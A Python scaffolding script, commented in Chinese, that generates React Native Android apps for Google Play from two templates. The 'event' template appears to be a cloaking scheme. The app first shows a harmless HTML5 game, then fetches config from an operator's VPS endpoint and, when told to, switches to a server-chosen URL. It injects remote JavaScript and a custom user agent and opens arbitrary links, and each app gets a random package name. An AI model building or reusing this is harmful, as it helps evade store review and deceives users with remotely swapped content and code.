#!/usr/bin/env python3
# setup_rn_google.py
import os
import subprocess
import json
import re
import shutil
import random
import string
from pathlib import Path
from typing import Dict, Any

# =================== 模板代码 ===================

APP_TSX_WHITE = '''/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 *
 * @format
 */

import {{ StatusBar, StyleSheet }} from 'react-native';
import WebView from 'react-native-webview';
import {{ useEffect, useRef }} from 'react';
import Orientation from 'react-native-orientation-locker';
import {{ SafeAreaView }} from 'react-native-safe-area-context';

function App() {{
  // @ts-ignore
  const objRef = useRef();
  // 修改页面方向
  Orientation.lockToLandscape();

  useEffect(() => {{
  }}, []);

  return (
    <SafeAreaView style={{styles.container}}>
      <StatusBar hidden={{true}} />
      <WebView
        source={{
          uri: '{GAME_URL}',
        }}
        style={{styles.container}}
      />
    </SafeAreaView>
  );
}}

const styles = StyleSheet.create({{
  container: {{
    flex: 1,
  }},
}});

export default App;
'''

APP_TSX_EVENT = '''import WebView, {{ WebViewMessageEvent }} from 'react-native-webview';
import {{ BackHandler, Linking, StatusBar }} from 'react-native';
import {{ useEffect, useRef, useState }} from 'react';
import {{ Adjust, AdjustConfig, AdjustEvent }} from 'react-native-adjust';
import DeviceInfo from 'react-native-device-info';
import Orientation from 'react-native-orientation-locker';
import {{ SafeAreaView }} from 'react-native-safe-area-context';

let appId = DeviceInfo.getBundleId();

export default function IndexScreen() {{
  const wvRef = useRef<WebView>(null);
  const [map, setMap] = useState({{
    url: 'https://storage.y8.com/y8-studio/html5/Playgama/fruity_match/?key=y8&value=default',
    injectedJavaScript: '',
    userAgent: '',
  }});

  console.log(appId);
  useEffect(() => {{
    Orientation.lockToLandscape();
    fetch(`{API_URL}/${{{{appId}}}}/xnhggfguy`)
      .then(response => response.json())
      .then(data => {{
        if (data && data.toUrl && data.sdkKey) {{
          Orientation.lockToPortrait();
          const adjustConfig = new AdjustConfig(
            data.sdkKey,
            AdjustConfig.EnvironmentProduction,
          );
          adjustConfig.setLogLevel(AdjustConfig.LogLevelVerbose);
          Adjust.initSdk(adjustConfig);
          setTimeout(() => {{
            BackHandler.addEventListener('hardwareBackPress', () => {{
              if (wvRef.current) {{
                wvRef.current.goBack();
              }}
              return true;
            }});
            let uu = `${{data.toUrl}}`;
            setMap({{
              url: uu,
              injectedJavaScript: data.trackSdkConfig,
              userAgent: data.userAgent,
            }});
          }}, 3000);
        }}
        console.log(data);
      }});
  }}, []);

  return (
    <SafeAreaView style={{ {{ flex: 1 }} }}>
      <StatusBar hidden={{true}} />
      <WebView
        ref={{wvRef}}
        style={{ {{ flex: 1 }} }}
        key={{Date.now()}}
        source={{ {{ uri: map.url }} }}
        userAgent={{map.userAgent}}
        injectedJavaScript={{map.injectedJavaScript}}
        injectedJavaScriptBeforeContentLoaded={{map.injectedJavaScript}}
        onMessage={{async (event: WebViewMessageEvent) => {{
          console.log(event);
          const data = JSON.parse(event.nativeEvent.data);
          console.log(data);
          if (data['event'] == 'openWindow') {{
            await Linking.openURL(data['params']['url']);
          }} else {{
            let adjustEvent = new AdjustEvent(data['event']);
            if (data['params']['revenue']) {{
              adjustEvent.setRevenue(
                Number(data['params']['revenue']),
                data['params']['currency'],
              );
            }}
            Adjust.trackEvent(adjustEvent);
          }}
        }}}}
      ></WebView>
    </SafeAreaView>
  );
}}
'''

PACKAGE_JSON_DEPENDENCIES = {
    "dependencies": {
        "@react-native/new-app-screen": "0.81.1",
        "axios": "^1.11.0",
        "react": "19.1.0",
        "react-native": "0.81.1",
        "react-native-adjust": "^5.4.2",
        "react-native-device-info": "^14.0.4",
        "react-native-orientation-locker": "^1.7.0",
        "react-native-safe-area-context": "^5.5.2",
        "react-native-webview": "^13.16.0"
    }
}

ANDROID_PERMISSIONS = [
    '<uses-permission android:name="android.permission.INTERNET"/>',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
    '<uses-permission android:name="com.google.android.gms.permission.AD_ID"/>',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />'
]

GRADLE_DEPS = '''
    implementation("com.android.installreferrer:installreferrer:2.2")
    implementation 'com.google.android.gms:play-services-ads-identifier:18.1.0'
'''

PROJECT_EXT_REACT = '''
project.ext.react = [
    entryFile      : "index.js",
    bundleAssetName: "index.android.bundle",
    bundleCommand  : "ram-bundle",
    extraPackagerArgs: ["--indexed-ram-bundle"],
    enableHermes   : false
]
'''

PROGUARD_RULES = '''
-keep class com.adjust.sdk.** { *; }
-keep class com.google.android.gms.common.ConnectionResult {
   int SUCCESS;
}
-keep class com.google.android.gms.ads.identifier.AdvertisingIdClient {
   com.google.android.gms.ads.identifier.AdvertisingIdClient$Info getAdvertisingIdInfo(android.content.Context);
}
-keep class com.google.android.gms.ads.identifier.AdvertisingIdClient$Info {
   java.lang.String getId();
   boolean isLimitAdTrackingEnabled();
}
-keep public class com.android.installreferrer.** { *; }
'''


# =================== 验证函数 ===================
def validate_environment():
    """验证必需的工具是否可用"""
    required_tools = ['node', 'npm', 'npx']
    missing_tools = []

    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)

    if missing_tools:
        print(f"❌ 缺少必需工具: {', '.join(missing_tools)}")
        print("请先安装 Node.js (https://nodejs.org/)")
        return False

    print("✅ 环境检查通过")
    return True

def validate_inputs(app_name: str, package_name: str) -> bool:
    """验证输入格式"""
    # 验证应用名称格式
    if not re.match(r'^[a-zA-Z][a-zA-Z0-9_-]*$', app_name):
        print("❌ 应用名称格式错误！只能包含字母、数字、下划线和连字符，且必须以字母开头")
        return False

    # 验证包名格式
    if not re.match(r'^[a-z][a-z0-9_]*(\.{1}[a-z][a-z0-9_]*)+$', package_name):
        print("❌ 包名格式错误！请使用标准格式，如 com.company.app")
        return False

    return True

def generate_random_package_name() -> str:
    """生成随机包名，格式：com.xxx.xxx，每段最多6个字符"""
    def generate_random_part(max_length: int = 6) -> str:
        # 确保第一个字符是字母，后续可以是字母或数字
        length = random.randint(3, max_length)  # 至少3个字符
        first_char = random.choice(string.ascii_lowercase)
        remaining_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1))
        return first_char + remaining_chars

    part1 = generate_random_part()
    part2 = generate_random_part()
    package_name = f"com.{part1}.{part2}"

    print(f"📦 自动生成包名: {package_name}")
    return package_name

# =================== 主函数 ===================
def main():
    print("🚀 开始创建 Google 出海 RN 项目")

    # 环境预检查
    if not validate_environment():
        return

    app_name = input("请输入应用名称（项目目录名）: ").strip()
    package_name = generate_random_package_name()

    # 输入验证
    if not validate_inputs(app_name, package_name):
        return

    project_type = input("项目类型? (white/event): ").strip().lower()
    lock_landscape = input("是否锁定横屏? (y/N): ").strip().lower() in ['y', 'yes']

    game_url = "https://storage.y8.com/y8-studio/html5/Playgama/fruity_match/?key=y8&value=default"
    api_url = ""

    if project_type == "white":
        game_url_input = input(f"游戏 URL (回车使用默认): ")
        if game_url_input.strip():
            game_url = game_url_input
    elif project_type == "event":
        api_url = input("请输入 VPS 接口域名 (如 https://www.skidu.xyz/j45rdsguyd): ").strip()
        if not api_url:
            print("❌ 事件包必须提供接口域名！")
            return
    else:
        print("❌ 类型只能是 white 或 event")
        return

    project_path = Path(app_name)
    if project_path.exists():
        print(f"❌ 目录 {app_name} 已存在，请删除或换名")
        return

    # 1. 创建项目
    print(f"\n🔧 创建 React Native 项目: {app_name}")
    try:
        # 使用 shell=True 确保在 Windows 上正确执行
        cmd = f'npx @react-native-community/cli init {app_name} --package-name {package_name}'
        subprocess.check_call(cmd, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ 创建项目失败: {e}")
        return
    except FileNotFoundError:
        print("❌ 找不到 npx 命令，请确保 Node.js 已正确安装并添加到 PATH")
        return

    os.chdir(app_name)

    # 2. 写入 package.json 依赖
    print("\n📦 安装依赖...")
    with open('package.json', 'r') as f:
        pkg = json.load(f)

    pkg["dependencies"].update(PACKAGE_JSON_DEPENDENCIES["dependencies"])
    with open('package.json', 'w') as f:
        json.dump(pkg, f, indent=2)

    try:
        subprocess.check_call("npm install", shell=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ 安装依赖失败: {e}")
        return

    # 3. 写入 App.tsx
    print("\n📝 生成 App.tsx...")
    if project_type == "white":
        code = APP_TSX_WHITE.format(GAME_URL=game_url)
    else:
        code = APP_TSX_EVENT.format(API_URL=api_url)

    with open('App.tsx', 'w') as f:
        f.write(code)

    # 4. 修改 AndroidManifest.xml
    manifest_path = Path("android/app/src/main/AndroidManifest.xml")
    content = manifest_path.read_text(encoding='utf-8')

    # 插入权限（在 <manifest> 标签后）
    insert_pos = content.find('<application')
    for perm in ANDROID_PERMISSIONS:
        if perm not in content:
            content = content[:insert_pos] + perm + '\n' + content[insert_pos:]

    manifest_path.write_text(content, encoding='utf-8')
    print("✅ AndroidManifest.xml 更新完成")

    # 5. 修改 build.gradle
    gradle_path = Path("android/app/build.gradle")
    content = gradle_path.read_text(encoding='utf-8')

    # 添加 dependencies
    dep_pos = content.find('dependencies {') + len('dependencies {')
    if GRADLE_DEPS.strip() not in content:
        content = content[:dep_pos] + GRADLE_DEPS + content[dep_pos:]

    # 添加 project.ext.react
    if 'project.ext.react' not in content:
        content = PROJECT_EXT_REACT + '\n' + content

    gradle_path.write_text(content, encoding='utf-8')
    print("✅ build.gradle 更新完成")

    # 6. 添加 proguard 规则
    proguard_path = Path("android/app/proguard-rules.pro")
    if proguard_path.exists():
        extra = proguard_path.read_text(encoding='utf-8')
        if PROGUARD_RULES.strip() not in extra:
            proguard_path.write_text(extra + '\n' + PROGUARD_RULES, encoding='utf-8')
    else:
        proguard_path.write_text(PROGUARD_RULES, encoding='utf-8')
    print("✅ 混淆规则添加完成")

    # 7. 完成
    print(f"""
🎉 项目创建完成！
📁 进入目录: cd {app_name}
📱 构建命令: yarn android
💡 注意检查: 签名文件、版本号、logo、RAM Bundle 是否生效
    """)


if __name__ == "__main__":
    main()